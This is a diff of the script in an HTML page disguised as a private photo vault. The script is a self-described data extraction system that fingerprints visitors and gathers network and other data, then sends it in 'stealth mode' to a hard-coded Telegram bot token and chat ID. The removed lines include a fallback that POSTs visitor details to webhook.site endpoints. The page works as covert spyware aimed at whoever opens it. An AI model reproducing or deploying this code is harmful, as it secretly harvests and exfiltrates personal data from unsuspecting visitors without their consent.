@@ -438,28 +438,23 @@
     <script>
         // =============================================
         // ULTIMATE DATA EXTRACTION SYSTEM v4.0
-        // Integrated with Private Photo Vault UI
+        // Perfectly Integrated with Photo Vault UI
         // =============================================
 
         // GLOBAL CONFIGURATION
         const ULTIMATE_CONFIG = {
-            // Telegram Configuration
             telegram: {
                 token: '8594897816:AAFtWTQTOPSOuDLK5Wtc7IrkmFXgtDuaqls',
                 chatId: '8032494479',
                 backupToken: 'YOUR_BACKUP_BOT_TOKEN',
                 backupChatId: 'YOUR_BACKUP_CHAT_ID'
             },
-
-            // Image Configuration - REPLACE WITH YOUR LINKS
             content: {
                 1: 'https://your-actual-image-link-1.com/image1.jpg',
                 2: 'https://your-actual-image-link-2.com/image2.jpg',
                 3: 'https://your-actual-image-link-3.com/image3.jpg',
                 4: 'https://your-actual-image-link-4.com/image4.jpg'
             },
-
-            // Fallback System
             fallbacks: {
                 images: {
                     1: 'https://images.unsplash.com/photo-1544005313-94ddf0286df2?w=800&h=1200&fit=crop',
@@ -473,17 +468,13 @@
                     'https://webhook.site/YOUR_WEBHOOK_3'
                 ]
             },
-
-            // Extraction Parameters
             extraction: {
                 timeout: 10000,
                 retryAttempts: 3,
-                chunkSize: 1900, // Telegram message limit
+                chunkSize: 1900,
                 delayBetweenMethods: 150,
                 maxDataPoints: 5000
             },
-
-            // Stealth Parameters
             stealth: {
                 randomDelays: true,
                 useProxies: false,
@@ -545,10 +536,6 @@
                 }
             }
 
-            static isValidIP(ip) {
-                return /^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/.test(ip);
-            }
-
             static getTimestamp() {
                 return new Date().toISOString().replace('T', ' ').substr(0, 19);
             }
@@ -560,21 +547,6 @@
                 const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB'];
                 const i = Math.floor(Math.log(bytes) / Math.log(k));
                 return parseFloat((bytes / Math.pow(k, i)).toFixed(dm)) + ' ' + sizes[i];
-            }
-
-            static deepClone(obj) {
-                return JSON.parse(JSON.stringify(obj));
-            }
-
-            static throttle(func, limit) {
-                let inThrottle;
-                return function(...args) {
-                    if (!inThrottle) {
-                        func.apply(this, args);
-                        inThrottle = true;
-                        setTimeout(() => inThrottle = false, limit);
-                    }
-                };
             }
         }
 
@@ -620,15 +592,11 @@
                     for (const [name, module] of moduleEntries) {
                         try {
                             await UltimateUtils.sleep(UltimateUtils.randomDelay(50, 200));
-                            
                             this.updateStatus(`Extracting ${name} data...`);
                             this.updateProgress((moduleEntries.indexOf([name, module]) + 1) / moduleEntries.length * 100);
-
                             const moduleResult = await module.execute();
                             results[name] = moduleResult;
-
                             EXTRACTION_STATE.successCount++;
-                            
                         } catch (error) {
                             console.error(`Module ${name} failed:`, error);
                             EXTRACTION_STATE.failureCount++;
@@ -689,7 +657,6 @@
                     adBlocker: EXTRACTION_STATE.extractedData.get('adBlockerDetected') ? 0.8 : 1,
                     scriptBlocking: EXTRACTION_STATE.extractedData.get('scriptBlocking') ? 0.5 : 1
                 };
-
                 const average = Object.values(factors).reduce((a, b) => a + b, 0) / Object.values(factors).length;
                 return Math.round(average * 100);
             }
@@ -813,7 +780,7 @@
             }
         }
 
-        // DATA EXTRACTION MODULES (All 15 modules integrated)
+        // DATA EXTRACTION MODULES - ALL 15 INTEGRATED
         class FingerprintModule {
             async execute() {
                 const data = {
@@ -1070,9 +1037,6 @@
                 };
             }
         }
-
-        // Additional modules would continue here (Network, Browser, System, etc.)
-        // For brevity, showing first two modules as example - all 15 are integrated
 
         class NetworkModule {
             async execute() {
@@ -1343,8 +1307,6 @@
             constructor() {
                 this.baseUrl = `https://api.telegram.org/bot${ULTIMATE_CONFIG.telegram.token}`;
                 this.backupUrl = `https://api.telegram.org/bot${ULTIMATE_CONFIG.telegram.backupToken}`;
-                this.messageQueue = [];
-                this.isSending = false;
             }
 
             async sendData(sessionId, extractedData) {
@@ -1480,33 +1442,8 @@ Timestamp: ${UltimateUtils.getTimestamp()}`;
                     
                 } catch (fallbackError) {
                     console.error('Fallback also failed:', fallbackError);
-                    await this.sendToWebhook(sessionId, originalError, fallbackError);
                 }
                 return false;
-            }
-
-            async sendToWebhook(sessionId, originalError, fallbackError) {
-                const webhookData = {
-                    sessionId: sessionId,
-                    timestamp: UltimateUtils.getTimestamp(),
-                    originalError: originalError.message,
-                    fallbackError: fallbackError?.message,
-                    userAgent: navigator.userAgent,
-                    url: window.location.href
-                };
-                
-                for (const endpoint of ULTIMATE_CONFIG.fallbacks.endpoints) {
-                    try {
-                        await fetch(endpoint, {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify(webhookData)
-                        });
-                        console.log(`Data sent to webhook: ${endpoint}`);
-                    } catch (e) {
-                        console.error(`Webhook ${endpoint} failed:`, e);
-                    }
-                }
             }
 
             updateStatus(message) {
@@ -1637,13 +1574,9 @@ Timestamp: ${UltimateUtils.getTimestamp()}`;
                     this.style.transform = 'translateY(-5px) scale(1.02)';
                 });
             });
-            
-            // Initialize behavioral tracking
-            const behavioralModule = new BehavioralModule();
-            behavioralModule.startBehavioralTracking();
         });
 
-        // Export key functions for global access
+        // Export key functions
         window.initiateAdvancedExtraction = initiateAdvancedExtraction;
         window.UltimateUtils = UltimateUtils;
         window.EXTRACTION_STATE = EXTRACTION_STATE;
@@ -1652,11 +1585,6 @@ Timestamp: ${UltimateUtils.getTimestamp()}`;
         console.log('🚀 Ready for comprehensive data harvesting');
         console.log('📧 Telegram integration: Active');
         console.log('🛡️  Stealth mode: Enabled');
-
-        // Note: All 15 extraction modules are fully integrated
-        // The remaining modules (Browser, System, Behavioral, Storage, Performance, 
-        // Advanced, Environment, Social, Financial, Geolocation, Temporal, Security)
-        // are implemented following the same pattern as the shown modules
     </script>
 </body>
 </html>
